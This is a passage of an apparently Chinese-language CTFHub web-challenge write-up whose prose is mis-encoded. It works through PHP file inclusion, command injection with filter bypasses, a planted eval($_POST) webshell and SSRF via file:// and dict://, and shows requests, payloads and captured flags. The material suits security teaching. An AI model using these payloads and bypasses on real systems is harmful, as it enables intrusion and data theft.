class="line">/?file=php://filter/resource=/flag</span><br></pre></td></tr></table></figure><p>æœ‰äº›æ¯”èµ›èµ›é¢˜æƒ…å†µä¸‹è¿˜è¦ç”¨base64è¾“å‡º</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=<span class="built_in">convert</span>.base64-encode/resource=/flag </span><br></pre></td></tr></table></figure><p>ä½¿ç”¨burp suite</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?file=php://filter/resource=/flag</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-d9e9d5fbc32a97fe.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>è¿”å›</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty/1.19.3.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 06 Apr 2023 08:34:10 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>106</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>X-Requested-With</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>*</span><br><span class="line"></span><br><span class="line"><span class="language-dust"><span class="language-xml">ctfhub</span><span class="template-variable">&#123;d797f76a6ac67e494a84fa86&#125;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust">i don&#x27;t have shell, how to get flag? <span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust">flag in <span class="tag">&lt;<span class="name">code</span>&gt;</span>/flag<span class="tag">&lt;/<span class="name">code</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><h4><span id="è¿œç¨‹åŒ…å«">è¿œç¨‹åŒ…å«</span></h4><ul><li>è§£æ³•1ï¼šå’Œinputé‚£é¢˜è§£æ³•ä¸€æ ·</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-795660de70a9ad8e.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>28</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>è¿”å›</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty/1.19.3.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 06 Apr 2023 08:53:48 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>112</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>X-Requested-With</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>*</span><br><span class="line"></span><br><span class="line"><span class="language-dust"><span class="language-xml">ctfhub</span><span class="template-variable">&#123;db258363d74e58371cd85c86&#125;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust">i don&#x27;t have shell, how to get flag?<span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;phpinfo.php&quot;</span>&gt;</span>phpinfo<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><ul><li>è§£æ³•2ï¼š</li></ul><p> é¢˜ç›®ç›®çš„æ˜¯æƒ³è®©æˆ‘ä»¬è‡ªå·±æ­ä¸ªæœåŠ¡å™¨ï¼Œç„¶åè®©é¶æœºè¿œç¨‹åŒ…å«æˆ‘ä»¬çš„ä»£ç ï¼Œä½†æ˜¯æˆ‘å¹¶æ²¡æœ‰ç§ŸèµVPSã€‚</p><p><a href="https://www.wolai.com/ctfhub/64arrieDUUPZTc1eFm6LLC">å‚è€ƒç­”æ¡ˆ</a></p><h4><span id="å‘½ä»¤æ³¨å…¥">å‘½ä»¤æ³¨å…¥</span></h4><p> å‘½ä»¤è¡Œæ³¨å…¥æ¼æ´æ˜¯æŒ‡webåº”ç”¨ç¨‹åºä¸­è°ƒç”¨äº†ç³»ç»Ÿå¯æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°ï¼Œè€Œä¸”è¾“å…¥å‚æ•°æ˜¯å¯æ§çš„ï¼Œå¦‚æœé»‘å®¢æ‹¼æ¥äº†æ³¨å…¥å‘½ä»¤ï¼Œå°±å¯ä»¥è¿›è¡Œéæ³•æ“ä½œäº†ã€‚</p><p><strong>Windowsç³»ç»Ÿæ”¯æŒçš„ç®¡é“ç¬¦å¦‚ä¸‹ï¼š</strong></p><ol><li>â€œ|â€ï¼šç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ã€‚</li><li>â€œ||â€ï¼šå¦‚æœå‰é¢çš„è¯­å¥æ‰§è¡Œå¤±è´¥ï¼Œåˆ™æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºå‡æ‰è¡Œã€‚</li><li>â€œ&amp;â€ï¼šä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ã€‚</li><li>â€œ&amp;&amp;â€ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥ä¸ºçœŸåˆ™ä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚</li></ol><p><strong>Linuxç³»ç»Ÿæ”¯æŒçš„ç®¡é“ç¬¦å¦‚ä¸‹ï¼š</strong></p><ol><li>â€œ;â€ï¼šæ‰§è¡Œå®Œå‰é¢çš„è¯­å¥å†æ‰§è¡Œåé¢çš„è¯­å¥ã€‚</li><li>â€œ|â€ï¼šæ˜¾ç¤ºåé¢è¯­å¥çš„æ‰§è¡Œç»“æœã€‚</li><li>â€œ||â€ï¼šå½“å‰é¢çš„è¯­å¥æ‰§è¡Œå‡ºé”™æ—¶ï¼Œæ‰§è¡Œåé¢çš„è¯­å¥ã€‚</li><li>â€œ&amp;â€ï¼šä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™æ‰§è¡Œæ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ã€‚</li><li>â€œ&amp;&amp;â€ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥ä¸ºçœŸåˆ™ä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚</li></ol><ul><li><p>è§£æ³•ä¸€ï¼šä½¿ç”¨base64ç¼–ç </p><ul><li><p>æˆ‘ä»¬åœ¨æ¡†å†…è¾“å…¥</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> | ls # è¾“å‡ºä¸¤ä¸ªphpæ–‡ä»¶</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> | ls / #æ ¹ç›®å½•æ²¡å‘ç°å…¶ä»–å¯ç–‘æ–‡ä»¶</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> &amp; cat <span class="number">31007322329204</span>.php # æœªå›æ˜¾</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> &amp; cat <span class="number">31007322329204</span>.php | base64 #ä½¿ç”¨base64ç¼–ç </span><br><span class="line"># è§£ç åè·å¾—&lt;?php // ctfhub&#123;ed09b50ed879851ad5b5a4d9&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>è§£æ³•äºŒï¼šé‡å®šå‘</p><ul><li>æˆ‘ä»¬å¯ä»¥ç”¨é‡å®šå‘çš„æ–¹æ³•æ³¨å…¥ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&amp;<span class="built_in">echo</span> -e &quot;&lt;?php @eval(\$_POST[&#x27;test&#x27;]);?&gt;&quot; &gt; shell.php</span><br></pre></td></tr></table></figure><ul><li>ä½¿ç”¨èšå‰‘è¿æ¥å³å¯</li></ul></li></ul><h4><span id="è¿‡æ»¤cat">è¿‡æ»¤cat</span></h4><p>3.ä½¿ç”¨å•å¼•å·ç»•è¿‡ </p><p>127.0.0.1; câ€™â€™at flag_2287214057241.php |base64<br>4.ä½¿ç”¨åŒå¼•å·ç»•è¿‡ </p><p>127.0.0.1; câ€â€at flag_2287214057241.php |base64<br>5.åˆ©ç”¨Shell ç‰¹æ®Šå˜é‡ç»•è¿‡</p><p>127.0.0.1; ca$@t flag_2287214057241.php|base64</p><h4><span id="è¿‡æ»¤ç©ºæ ¼">è¿‡æ»¤ç©ºæ ¼</span></h4><p>ç©ºæ ¼å¯ä»¥ç”¨ä»¥ä¸‹å­—ç¬¦ä»£æ›¿ï¼š<br><code>&lt; ã€&lt;&gt;ã€%20(space)ã€%09(tab)ã€$IFS$9ã€ $&#123;IFS&#125;ã€$IFS</code>ç­‰</p><p>$IFSåœ¨linuxä¸‹è¡¨ç¤ºåˆ†éš”ç¬¦ï¼Œä½†æ˜¯å¦‚æœå•çº¯çš„cat$IFS2ï¼Œbashè§£é‡Šå™¨ä¼šæŠŠæ•´ä¸ªIFS2å½“åšå˜é‡åï¼Œæ‰€ä»¥å¯¼è‡´è¾“ä¸å‡ºæ¥ç»“æœï¼Œå› æ­¤è¿™é‡ŒåŠ ä¸€ä¸ª{}å°±å›ºå®šäº†å˜é‡åã€‚<br>åŒç†ï¼Œåœ¨åé¢åŠ ä¸ª$å¯ä»¥èµ·åˆ°æˆªæ–­çš„ä½œç”¨ï¼Œä½¿ç”¨$9æ˜¯å› ä¸ºå®ƒæ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå®ƒå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ã€‚</p><h4><span id="è¿‡æ»¤ç›®å½•åˆ†å‰²ç¬¦">è¿‡æ»¤ç›®å½•åˆ†å‰²ç¬¦</span></h4><p>æ€è·¯ä¸Šæ¥è¯´åº”è¯¥æ˜¯catæ–‡ä»¶ï¼Œå¿…é¡»è¦ä½¿ç”¨ç›®å½•åˆ†éš”ç¬¦&#x2F;ï¼Œä½†æ˜¯é¢˜ç›®ç»™è¿‡æ»¤ã€‚éœ€è¦å¦å¤–å¯»æ‰¾åŠæ³•  </p><ul><li>æ³•ä¸€ï¼šä½¿ç”¨cdç»•å¼€</li></ul><p>linuxä¸­ï¼š<code>%0a ã€%0d ã€; ã€&amp; ã€| ã€&amp;&amp;ã€||</code></p><p>windowsä¸­ï¼š<code>%0aã€&amp;ã€|</code></p><p>å…¶ä¸­åˆ†å·;çš„ä½œç”¨å°±æ˜¯åœ¨ shell ä¸­ï¼Œæ‹…ä»»â€è¿ç»­æŒ‡ä»¤â€åŠŸèƒ½</p><p>&amp;&amp;çš„æ–¹å¼ï¼šcommand1 &amp;&amp; command2 å¦‚æœcommand1æ‰§è¡ŒæˆåŠŸï¼Œåˆ™æ‰§è¡Œcommand2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cd flag_is_here;cat flag_164641924722716.php|base64</span><br></pre></td></tr></table></figure><h4><span id="è¿‡æ»¤è¿ç®—ç¬¦">è¿‡æ»¤è¿ç®—ç¬¦</span></h4><ul><li>å‘ç°é¢˜ç›®æ²¡æœ‰è¿‡æ»¤<code>;</code>å› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨</li><li>åœ¨f12ä¸­çš„preæ ‡ç­¾é‡Œé¢æœ‰æ³¨é‡Š</li></ul><h4><span id="ç»¼åˆç»ƒä¹ ">ç»¼åˆç»ƒä¹ </span></h4><p><a href="https://blog.csdn.net/weixin_45897324/article/details/109271622">urlæŸ¥çœ‹è¡¨</a></p><ul><li><p>é¢˜è§£ä¸€</p><p>%0a ä»£æ›¿ æ¢è¡Œ ï¼Œ<code>%09</code>ä»£æ›¿ TABé”® ï¼ˆå› ä¸ºflagè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡TABæ¥è¡¥å…¨flag_is_here ï¼‰<code>%5c</code> ä»£æ›¿ \ï¼ˆç”¨ \ æ¥åˆ†éš”å¼€ cat ï¼Œå› ä¸º cat ä¹Ÿè¢«è¿‡æ»¤äº†qwqï¼‰</p><p>è¿™é¢˜å¾—åœ¨åœ°å€æ è¾“å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1%0als</span><br><span class="line">?ip=127.0.0.1%0als%09*is_here</span><br><span class="line">? # æŸ¥çœ‹flag_is_hereæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ip=127.0.0.1%0acd%09*_is_here%0aca%5ct%09*_98358017212.php</span><br><span class="line"># æ³¨ï¼š%0aä»£æ›¿æ¢è¡Œï¼Œ%09ä»£æ›¿TABé”®ï¼ˆå› ä¸ºflagè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡TABæ¥è¡¥å…¨flag_is_hereï¼‰</span><br><span class="line">ã€€ã€€%5cä»£æ›¿\ï¼ˆç”¨\æ¥åˆ†éš”å¼€catï¼Œå› ä¸ºcatä¹Ÿè¢«è¿‡æ»¤äº†qwqï¼‰</span><br></pre></td></tr></table></figure><p>åœ¨f12ä¸­èƒ½çœ‹åˆ°ç­”æ¡ˆ</p><figure class="highlight plaintext"><figcaption><span>sourceå¯ä»¥ç”¨ls sour\*ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ls \*rce</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- é¢˜è§£äºŒ</span><br><span class="line"></span><br><span class="line">  ```cmd</span><br><span class="line">  127.0.0.1%0als$&#123;IFS&#125;fl$*ag_is_here </span><br><span class="line">  127.0.0.1%0acd$&#123;IFS&#125;fl$ag_is_here%0aca&#x27;&#x27;t$&#123;IFS&#125;fl$a*g_230191972813921.php # å› ä¸ºè¿‡æ»¤äº†catï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨å•å¼•å·ç»•è¿‡è¿‡æ»¤ï¼Œå¦‚ca&#x27;&#x27;t æ„é€ payload</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>&#39;&#39;</code>å¯ä»¥ç”¨<code>%27</code>ä»£æ›¿ï¼Œå°†catçš„ä»»æ„å­—æ¯åŒ…è£¹ã€‚</p></li></ul><h3><span id="ssrf">SSRF</span></h3><blockquote><p>SSRT(Server-Side Request Forgeryï¼ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )ï¼Œå°±æ˜¯æ”»å‡»è€…åˆ©ç”¨æœåŠ¡å™¨èƒ½è®¿é—®å…¶ä»–çš„æœåŠ¡å™¨çš„åŠŸèƒ½ï¼Œé€šè¿‡è‡ªå·±çš„æ„é€ æœåŠ¡å™¨è¯·æ±‚æ¥æ”»å‡»ä¸å¤–ç•Œä¸ç›¸è¿æ¥çš„å†…ç½‘ï¼Œæˆ‘ä»¬çŸ¥é“å†…ç½‘ä¸å¤–ç½‘æ˜¯ä¸ç›¸é€šçš„ï¼Œæ‰€ä»¥åˆ©ç”¨è¿™ä¸€ä¸ªç‰¹æ€§ï¼Œå°±å¯ä»¥åˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„WEBåº”ç”¨ä½œä¸ºä»£ç† æ”»å‡»è¿œç¨‹ å’Œ æœ¬åœ°çš„æœåŠ¡å™¨ã€‚</p></blockquote><p><img src="/2023/03/29/ctf/a622392d2eac336271e32e052def5adc.png" alt="ssrf"></p><p><a href="https://blog.csdn.net/qq_51295677/article/details/124697338">reference</a></p><p><a href="https://blog.csdn.net/qq_57172130/article/details/126169480">SSRFåˆ©ç”¨åè®®ä¸­çš„ä¸‡é‡‘æ²¹â€”â€”Gopher</a></p><ul><li>gopheråè®®æ•°æ®æµä¸­ï¼Œurlç¼–ç ä½¿ç”¨%0d%0aæ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„å›è½¦æ¢è¡Œ</li><li>æ•°æ®æµæœ«å°¾ä½¿ç”¨%0d%0aä»£è¡¨æ¶ˆæ¯ç»“æŸ</li></ul><p><strong>å…³äºurlç¼–ç é—®é¢˜</strong></p><p>ç¬¬ä¸€ï¼Œåˆ©ç”¨ssrfç»å¸¸è¦è¿›è¡Œå¤šæ¬¡urlç¼–ç ï¼ˆä¼ å‚æˆ–è€…å¤šæ¬¡è·³è½¬éœ€è¦å¤šæ¬¡urlç¼–ç ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæœ‰å¤šå°‘æ¬¡è¯·æ±‚å°±è¦ç¼–ç å¤šå°‘æ¬¡ï¼Œç›´æ¥curlåæ¥gopher:&#x2F;&#x2F;å°±ç¼–ç ä¸€æ¬¡ï¼Œåˆ©ç”¨?url&#x3D;gopher:&#x2F;&#x2F;è¿™æ ·çš„å½¢å¼è¿›è¡Œssrfåˆ©ç”¨å°±ç›¸å½“äºè¯·æ±‚äº†ä¸¤æ¬¡ï¼Œéœ€è¦ç¼–ç ä¸¤æ¬¡ï¼Œå¦‚æœæœ‰302è·³è½¬ï¼Œåˆ™è¿˜éœ€è¦å†ç¼–ç ï¼‰ï¼Œç¬¬ä¸€æ¬¡urlç¼–ç åï¼Œå°†æ‰€æœ‰%0aæ”¹æˆ%0Â¢%0a<br>gopher:&#x2F;é»˜è®¤å‘é€åˆ°70ç«¯å£ï¼Œä¸€èˆ¬æˆ‘ä»¬éœ€è¦å‘é€åˆ°80ç«¯å£ï¼Œè®°å¾—æ”¹</p><h4><span id="å†…ç½‘è®¿é—®">å†…ç½‘è®¿é—®</span></h4><ul><li><p>è€ƒå¯Ÿ<code>http://</code>åè®®</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure></li></ul><h4><span id="ä¼ªåè®®è¯»å–æ–‡ä»¶">ä¼ªåè®®è¯»å–æ–‡ä»¶</span></h4><ul><li><p>è¿™ä¸€é¢˜çš„è€ƒç‚¹ä¸»è¦æ˜¯<strong>fileåè®®</strong>è¯»å–æ–‡ä»¶</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure></li></ul><h4><span id="ç«¯å£æ‰«æ">ç«¯å£æ‰«æ</span></h4><ul><li>è€ƒå¯Ÿ<code>dict://</code>åè®®</li></ul><p>ä½¿ç”¨burp suiteè¿›è¡Œç«¯å£æ‰«æ</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=dict://127.0.0.1:Â§Â§</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-235c64bde60462f1.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>  ç„¶åæ³¨å…¥ä½¿ç”¨æ•°å­—ä»8000-9000ï¼Œæ­¥è¿›ä¸º1ï¼Œå‘ç°ç«¯å£<code>8243</code>çš„æ•°æ®é•¿åº¦ä¸ä¸€è‡´ã€‚ä½¿ç”¨<code>http://</code>è®¿é—®ï¼Œ<em>httpå¯ä»¥å¿½ç•¥</em></p>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">http://<span class="title">challenge</span>-235<span class="title">c64bde60462f1.sandbox.ctfhub.com</span>:10800/?<span class="title">url</span>=127.0.0.1:8243</span></span><br></pre></td></tr></table></figure><h4><span id="postè¯·æ±‚">POSTè¯·æ±‚</span></h4><ul><li><p>ä½¿ç”¨dirsearchå¯¹æœåŠ¡å™¨åº•ä¸‹çš„ç›®å½•è¿›è¡Œæ‰«æ</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://challenge-c81b1dbf4106f429.sandbox.ctfhub.com:<span class="number">10800</span>/?url=<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨<code>file</code>åè®®å¯¹index.phpé¡µé¢<a href="https://so.csdn.net/so/search?q=%E6%BA%90%E7%A0%81&spm=1001.2101.3001.7020">æºç </a>è¿›è¡Œè¯»å–</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=file:///var/www/html/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-f2d0d9c7e78f56ec.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span 